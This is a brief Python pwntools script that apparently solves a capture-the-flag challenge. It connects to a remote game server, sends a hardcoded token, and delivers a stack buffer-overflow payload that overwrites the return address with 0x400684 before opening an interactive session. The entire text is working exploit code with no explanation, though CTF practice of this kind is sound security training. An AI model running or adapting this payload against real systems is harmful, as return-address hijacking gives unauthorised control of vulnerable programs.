from pwn import *

context.log_level = 'debug'

#p = process("./sendyousomething")
p = remote("ctfgame.acdxvfsvd.net",10002)

if __name__ == '__main__':
	
	p.recvuntil("Your Token:")
	p.sendline("50llRDHlw2UkO1aAZTemJAae6dBGdTgD")
	p.recvuntil("BUT YOU SHOULD SEND ME A ROP")
	
	payload = 'a'*0x10 + 'b'*0x8 + p64(0x400684) + 'c'*0x8
#	gdb.attach(p)
	p.send(payload)
	p.interactive()
